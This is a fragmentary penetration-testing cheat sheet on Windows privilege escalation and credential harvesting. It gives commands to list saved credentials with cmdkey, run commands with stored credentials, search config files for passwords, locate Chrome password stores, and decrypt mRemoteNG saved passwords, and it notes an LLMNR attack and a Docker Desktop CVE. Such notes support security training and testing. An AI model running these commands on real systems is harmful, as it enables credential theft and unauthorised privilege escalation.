...
- CMDKey
  1. `cmdkey /list`
  2. `runas /savecred /user:[USER] [COMMAND]`
...
- **Configuration files** in installed applications 
  ...
  ```powershell
  findstr /spin "password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.bat
  ```

  - Default IIS `C:\inetpub\wwwroot\web.config`
...
- **Extension search**, in interesting directories
...
- **Chrome credentials**
	...
	- Check if chrome is installed 
		...
		```cmd
		dir C:\Users\%USERNAME%\AppData\Local\Google\Chrome
		```

	- Use [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve google passwords 
...
```cmd
findstr /SIM /C:"[STRING]" *.[EXT1_OR_*] *.[EXT2]
```
...
Check for writable shares &rarr; LLMNR Exploit
...
- [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e): **Docker Desktop Community Edition** < 2.1.0.1

- **mRemoteNG** saves credentials in `confCons.xml`, with default location set to `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`. In this file, the attribute`Protected` corresponds to the master password used to encrypt the document. if the user didn't set a custom master password, use [RemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password under some element named `Node`.

	```bash
	python3 mremoteng_decrypt.py -s [Node_Encrypted_Pwd] -p [Master_Decrypted_pwd]
	```
...
- **Research**
	...
	- `wes`
		...
		```bash
		python3 ~/TOOLS/PRIVESC_WINDOWS/wesng/wes.py --update-wes
		python3 ~/TOOLS/PRIVESC_WINDOWS/wesng/wes.py systeminfo.txt | grep -i pivilege -C 3
		```
